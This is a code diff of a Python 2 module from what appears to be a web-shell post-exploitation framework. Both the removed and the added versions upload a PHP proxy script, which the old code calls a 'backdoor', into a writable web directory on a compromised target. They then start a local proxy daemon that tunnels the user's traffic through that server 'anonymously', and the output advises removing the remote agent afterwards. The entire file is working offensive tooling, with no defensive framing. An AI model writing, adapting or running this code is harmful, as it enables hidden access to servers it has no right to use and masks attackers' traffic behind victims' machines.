@@ -1,27 +1,18 @@
-'''
-Created on 20/set/2011
-
-@author: norby
-'''
-
-from core.module import Module, ModuleException
-from core.vector import VectorList, Vector as V
-from core.parameters import ParametersList, Parameter as P
-from core.http.request import agents
+from modules.file.upload2web import Upload2web
+from modules.net.phpproxy import Phpproxy
+from core.moduleexception import ProbeSucceed, ProbeException
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from argparse import SUPPRESS
+import re, os
 from random import choice
-from string import letters
-import re
-from urlparse import urlparse
+from core.http.request import agents
 
 import SocketServer
 import urllib
-import sys
-from threading import Thread
+from thread import start_new_thread
+from core.utils import url_validator
 
-from random import choice
-
-classname = 'Proxy'
-
+WARN_NOT_URL = 'Not a valid URL'
 
 class ProxyHandler(SocketServer.StreamRequestHandler):
 
@@ -88,109 +79,76 @@ class ProxyHandler(SocketServer.StreamRequestHandler):
         self.wfile.close()
 
 
+class Proxy(Phpproxy):
+    '''Install and run Proxy to tunnel traffic through target'''
+
+    
+    def _set_args(self):
+        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
+        
+        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
+        self.argparser.add_argument('-force', action='store_true')
+        self.argparser.add_argument('-just-run', metavar='URL')
+        self.argparser.add_argument('-just-install', action='store_true')
+        self.argparser.add_argument('-lhost', default='127.0.0.1')
+        self.argparser.add_argument('-lport', default='8081', type=int)
+    
+        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
+        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)
 
 
-
-
-
-class Proxy(Module):
-
-    params = ParametersList('Install and run real proxy through target', [],
-                    P(arg='rpath', help='Upload proxy script to web accessible path (ends with \'.php\')'),
-                    P(arg='rurl', help='Run directly proxy server using uploaded proxy script HTTP url'),
-                    P(arg='finddir', help='Install proxy script automatically starting from web accessible dir', default='.'),
-                    P(arg='lport', help='Local proxy port', default=8080, type=int),
-                    )
-
-
-    def __get_backdoor(self):
-
-        backdoor_path = self.modhandler.path_modules + '/net/external/proxy.php'
-
-        try:
-            f = open(backdoor_path)
-        except IOError:
-            raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
-
-        return f.read()
-
-    def __upload_file_content(self, content, rpath):
-        self.modhandler.load('file.upload').set_file_content(content)
-        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath, 'chunksize': 256 })
-
-        return response
-
-    def __find_writable_dir(self, path = 'find'):
-
-        self.modhandler.set_verbosity(6)
-
-        self.modhandler.load('find.webdir').run({ 'rpath' : path })
-
-        url = self.modhandler.load('find.webdir').found_url
-        dir = self.modhandler.load('find.webdir').found_dir
-
-        self.modhandler.set_verbosity()
-
-        return dir, url
-
-
-    def __run_proxy_server(self, rurl, lport, lhost='127.0.0.1'):
+    def _run_proxy_server(self, rurl, lport, lhost):
 
         SocketServer.TCPServer.allow_reuse_address = True
         server = SocketServer.ThreadingTCPServer((lhost, lport), ProxyHandler)
         server.rurl = rurl
-        print '[%s] Proxy running. Set \'http://%s:%i\' in your favourite HTTP proxy' % (self.name, lhost, lport)
         server.serve_forever()
 
 
-    def run_module(self, rpath, rurl, finddir, lport):
+    def _get_proxy_path(self):
+        return os.path.join(self.modhandler.path_modules, 'net', 'external', 'proxy.php')
 
-        rname = ''.join(choice(letters) for i in xrange(4)) + '.php'
-
-
-        if not rurl:
-
-            if not rpath and finddir:
-                path, url = self.__find_writable_dir(finddir)
-                if not (path and url):
-                    raise ModuleException(self.name, 'Writable dir in \'%s\' not found. Specify writable dir using \':net.proxy rpath=writable_dir/proxy.php\'' % finddir)
-                else:
-                    path = path + rname
-                    url = url + rname
-            else:
-                if not rpath.endswith('.php'):
-                    raise ModuleException(self.name, 'Remote PHP path must ends with \'.php\'')
-                path = rpath
-                url = None
-
-
-            if path:
-
-                phpfile = self.__get_backdoor()
-                response = self.__upload_file_content(phpfile, path)
-
-                if response:
-
-                    if url:
-                        self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=%s\'' % (self.name, url))
-                    else:
-                        self.mprint('[%s] Proxy uploaded, launch \':net.proxy rurl=http://\' followed by uploaded script url' % (self.name))
-
-                    self.mprint('[%s] When finished remove script \'%s\'' % (self.name, path))
-
-
-            else:
-                raise ModuleException(self.name,  "Error installing remote PHP proxy, check uploading path")
-
-
+    def _prepare_probe(self):
+        
+        if not self.args['just_run']:
+            Phpproxy._prepare_probe(self)
         else:
+            if not url_validator.match(self.args['just_run']):
+                raise ProbeException(self.name, '\'%s\': %s' % (self.args['just_run'], WARN_NOT_URL) )
+            
+            self.args['url'] = self.args['just_run']
+            self.args['rpath'] = ''
 
+    def _probe(self):
+        if not self.args['just_run']:
             try:
-                if urlparse( rurl ).scheme not in ('http', 'https'):
-                    raise ValueError('invalid URL (specify http or https)')
-                self.__run_proxy_server(rurl, lport)
-            except Exception, e:
-                raise ModuleException(self.name,'Proxy start on port %i failed with error %s' % (lport, str(e)) )
+                Phpproxy._probe(self)
+            except ProbeSucceed:
+                pass
+            
+        if not self.args['just_install']:
+            start_new_thread(self._run_proxy_server, (self.args['url'], self.args['lport'], self.args['lhost']))
 
+    def _verify_probe(self):
+        if not self.args['just_run']:
+            Phpproxy._verify_probe(self)   
+        else:
+            # With just_run, suppose good result to correctly print output
+            self._result = True
+    
+    def _output_result(self):
+    
+        Phpproxy._output_result(self)
+        
+        rpath = ' '
+        if self.args['rpath']:
+            rpath = '\'%s\' ' % self.args['rpath']
+        
+        self._output = """Proxy daemon spawned, set \'http://%s:%i\' as HTTP proxy to start browsing anonymously through target.
+Run ":net.proxy -just-run '%s'" to respawn local proxy daemon without reinstalling remote agent.
+When not needed anymore, remove%sremote agent.""" % (self.args['lhost'], self.args['lport'], self.args['url'], rpath)
 
-
+        
+        
+            
+        
